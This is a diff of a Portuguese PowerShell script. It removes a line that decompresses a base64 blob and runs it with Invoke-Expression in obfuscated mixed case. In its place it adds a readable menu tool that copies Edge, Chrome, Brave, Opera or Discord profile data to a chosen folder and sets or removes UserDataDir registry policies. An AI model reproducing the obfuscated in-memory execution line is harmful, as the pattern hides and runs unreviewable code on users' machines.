@@ -8,4 +8,155 @@ Function Verificar-Administrador {
 
 Verificar-Administrador
 
-iNvOkE-eXpRESsion( New-ObJeCT sysTEm.iO.comprESSIOn.DeFlATesTrEAm([systeM.io.mEMORySTReam] [sYsTem.CoNVERT]::frOMBAse64STRINg('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'),[sySTEm.Io.coMPREssiON.CompRessioNModE]::dECoMPResS )| fOReach-ObjeCT{ New-ObJeCT io.sTREaMreAder( $_ ,[sYSTEM.tEXt.encOdinG]::ASCIi) } |FoREACh-ObjeCT{$_.REadtoENd() } ) 
+Start-Transcript -Path "$env:TEMP\script-log.txt" -Append
+Write-Host "Iniciando o script..." -ForegroundColor Green
+
+$ErrorActionPreference = "Stop"
+
+Function Verificar-Instalacao {
+    param(
+        [string]$nomeAplicativo,
+        [string]$caminhoInstalacao
+    )
+    if (Test-Path $caminhoInstalacao) {
+        Write-Host "$nomeAplicativo está instalado." -ForegroundColor Cyan
+        return $true
+    } else {
+        Write-Host "$nomeAplicativo não está instalado. Verifique se ele está corretamente instalado no seu sistema." -ForegroundColor Yellow
+        return $false
+    }
+}
+
+Function Copiar-Dados {
+    param(
+        [string]$origem,
+        [string]$destino
+    )
+    if (Test-Path $origem) {
+        if (-not (Test-Path $destino)) {
+            New-Item -Path $destino -ItemType Directory -Force
+            Write-Host "Criada nova pasta de destino: $destino" -ForegroundColor Green
+        }
+        Write-Host "Copiando dados de '$origem' para '$destino'..." -ForegroundColor Cyan
+        try {
+            Copy-Item -Path "$origem\*" -Destination $destino -Recurse -Force
+            Write-Host "Dados copiados com sucesso!" -ForegroundColor Green
+        } catch {
+            Write-Host "Erro ao copiar dados: $_" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "A pasta de origem '$origem' não foi encontrada. Nenhuma ação será realizada." -ForegroundColor Yellow
+    }
+}
+
+Function Obter-DiretorioNavegator {
+    param(
+        [string]$diretorioEscolhido
+    )
+    $pastaNavegator = Join-Path -Path $diretorioEscolhido -ChildPath "navegator"
+    if (-not (Test-Path $diretorioEscolhido)) {
+        Write-Host "O diretório '$diretorioEscolhido' não existe. Por favor, forneça um caminho válido." -ForegroundColor Red
+        Exit
+    }
+    if (-not (Test-Path $pastaNavegator)) {
+        Write-Host "A pasta 'navegator' não existe no diretório '$diretorioEscolhido'. Por favor, crie a pasta e forneça o caminho correto." -ForegroundColor Red
+        Exit
+    } else {
+        Write-Host "A pasta 'navegator' foi encontrada em: $pastaNavegator" -ForegroundColor Green
+    }
+    return $pastaNavegator
+}
+
+Function Configurar-NavegadorOuApp {
+    param(
+        [string]$nomeAplicativo,
+        [string]$caminhoInstalacao,
+        [string]$subPasta,
+        [string]$regKeyPath,
+        [string]$pastaAntiga
+    )
+    if (Verificar-Instalacao -nomeAplicativo $nomeAplicativo -caminhoInstalacao $caminhoInstalacao) {
+        $subPastaAplicativo = Join-Path -Path $pastaNavegator -ChildPath $subPasta
+        if (-not (Test-Path $subPastaAplicativo)) {
+            New-Item -Path $subPastaAplicativo -ItemType Directory -Force
+            Write-Host "Subpasta '$subPasta' criada em: $subPastaAplicativo" -ForegroundColor Green
+        }
+        Copiar-Dados -origem $pastaAntiga -destino $subPastaAplicativo
+        if (-not (Test-Path $regKeyPath)) {
+            Write-Host "Criando chave de registro: $regKeyPath" -ForegroundColor Yellow
+            New-Item -Path $regKeyPath -Force
+        }
+        Set-ItemProperty -Path $regKeyPath -Name "UserDataDir" -Value $subPastaAplicativo
+        Set-ItemProperty -Path $regKeyPath -Name "ForceUserDataDir" -Value 1
+        Write-Host "$nomeAplicativo configurado para usar a pasta: $subPastaAplicativo" -ForegroundColor Green
+    }
+}
+
+Function Reverter-NavegadorOuApp {
+    param(
+        [string]$nomeAplicativo,
+        [string]$regKeyPath,
+        [string]$pastaAntiga
+    )
+    if (Test-Path $regKeyPath) {
+        Remove-ItemProperty -Path $regKeyPath -Name "UserDataDir" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $regKeyPath -Name "ForceUserDataDir" -ErrorAction SilentlyContinue
+        Write-Host "As configurações de registro para $nomeAplicativo foram removidas." -ForegroundColor Green
+    } else {
+        Write-Host "Nenhuma configuração encontrada no registro para $nomeAplicativo." -ForegroundColor Yellow
+    }
+    if (Test-Path $pastaAntiga) {
+        Write-Host "A pasta original de dados para $nomeAplicativo permanece intacta." -ForegroundColor Cyan
+    } else {
+        Write-Host "A pasta original de dados para $nomeAplicativo não foi encontrada." -ForegroundColor Red
+    }
+}
+
+$diretorioEscolhido = Read-Host "Digite o caminho completo onde a pasta 'navegator' está (exemplo: C:\Testes\) "
+$pastaNavegator = Obter-DiretorioNavegator -diretorioEscolhido $diretorioEscolhido
+
+$opcoes = @(
+    @{Nome = "Edge"; CaminhoInstalacao = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"; SubPasta = "Edge"; RegKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"; PastaAntiga = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
+    @{Nome = "Chrome"; CaminhoInstalacao = "C:\Program Files\Google\Chrome\Application\chrome.exe"; SubPasta = "Chrome"; RegKeyPath = "HKLM:\SOFTWARE\Policies\Google\Chrome"; PastaAntiga = "$env:LOCALAPPDATA\Google\Chrome\User Data"},
+    @{Nome = "Brave"; CaminhoInstalacao = "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"; SubPasta = "Brave"; RegKeyPath = "HKLM:\SOFTWARE\Policies\BraveSoftware\Brave-Browser"; PastaAntiga = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
+    @{Nome = "Opera"; CaminhoInstalacao = "C:\Program Files\Opera\opera.exe"; SubPasta = "Opera"; RegKeyPath = "HKLM:\SOFTWARE\Policies\Opera Software\Opera"; PastaAntiga = "$env:LOCALAPPDATA\Opera Software\Opera Stable"},
+    @{Nome = "Discord"; CaminhoInstalacao = "C:\Users\$env:USERNAME\AppData\Local\Discord\app-*.exe"; SubPasta = "Discord"; RegKeyPath = "HKCU:\Software\Discord"; PastaAntiga = "$env:APPDATA\discord"}
+)
+
+Write-Host "Escolha a ação:" -ForegroundColor Cyan
+Write-Host "1. Configurar"
+Write-Host "2. Reverter"
+
+$acao = Read-Host "Digite o número correspondente à ação desejada"
+
+if ($acao -eq 1) {
+    Write-Host "Escolha o navegador ou aplicativo para configurar o UserDataDir:" -ForegroundColor Cyan
+    for ($i = 0; $i -lt $opcoes.Length; $i++) {
+        Write-Host "$($i+1). $($opcoes[$i].Nome)"
+    }
+    $escolha = Read-Host "Digite o número correspondente ao aplicativo ou navegador"
+    if ($escolha -ge 1 -and $escolha -le $opcoes.Length) {
+        $aplicativoEscolhido = $opcoes[$escolha - 1]
+        Configurar-NavegadorOuApp -nomeAplicativo $aplicativoEscolhido.Nome -caminhoInstalacao $aplicativoEscolhido.CaminhoInstalacao -subPasta $aplicativoEscolhido.SubPasta -regKeyPath $aplicativoEscolhido.RegKeyPath -pastaAntiga $aplicativoEscolhido.PastaAntiga
+    } else {
+        Write-Host "Opção inválida. O script será encerrado." -ForegroundColor Red
+    }
+} elseif ($acao -eq 2) {
+    Write-Host "Escolha o navegador ou aplicativo para reverter o UserDataDir:" -ForegroundColor Cyan
+    for ($i = 0; $i -lt $opcoes.Length; $i++) {
+        Write-Host "$($i+1). $($opcoes[$i].Nome)"
+    }
+    $escolha = Read-Host "Digite o número correspondente ao aplicativo ou navegador"
+    if ($escolha -ge 1 -and $escolha -le $opcoes.Length) {
+        $aplicativoEscolhido = $opcoes[$escolha - 1]
+        Reverter-NavegadorOuApp -nomeAplicativo $aplicativoEscolhido.Nome -regKeyPath $aplicativoEscolhido.RegKeyPath -pastaAntiga $aplicativoEscolhido.PastaAntiga
+    } else {
+        Write-Host "Opção inválida. O script será encerrado." -ForegroundColor Red
+    }
+} else {
+    Write-Host "Opção inválida. O script será encerrado." -ForegroundColor Red
+}
+
+Write-Host "Processo concluído! Pressione qualquer tecla para sair." -ForegroundColor Green
+[System.Console]::ReadKey($true) | Out-Null
+Stop-Transcript
